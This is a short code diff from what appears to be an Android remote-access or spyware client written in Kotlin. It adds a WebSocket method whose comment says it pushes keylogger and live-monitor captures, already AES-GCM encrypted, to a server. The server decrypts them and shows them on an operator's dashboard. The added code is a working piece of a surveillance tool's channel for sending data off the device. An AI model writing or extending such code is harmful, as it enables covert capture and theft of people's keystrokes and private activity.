@@ -125,6 +125,28 @@ class WebSocketTransport(
     }
 
     /**
+     * Sends a result-typed WS message carrying [encryptedData] (already AES-GCM
+     * encrypted + base64). This is used for unsolicited real-time pushes
+     * (keylogger, live monitors) that are NOT replies to a specific command.
+     * The server's handleResult() decrypts `data` and broadcasts it to the
+     * dashboard over SSE.
+     */
+    fun sendResult(commandId: String, encryptedData: String) {
+        if (!connected) return
+        try {
+            val resultMsg = json.encodeToString(ResultMessage(
+                type = "result",
+                device_id = deviceId,
+                command_id = commandId,
+                data = encryptedData
+            ))
+            ws?.send(resultMsg)
+        } catch (e: Exception) {
+            Log.w(TAG, "sendResult failed: ${e.message}")
+        }
+    }
+
+    /**
      * Application-level ping. The server treats a `ping` WS message as a liveness
      * signal (updates LastSeen) and replies with `pong`. Without this the server's
      * offline checker marks the device offline after ~45s even though the socket
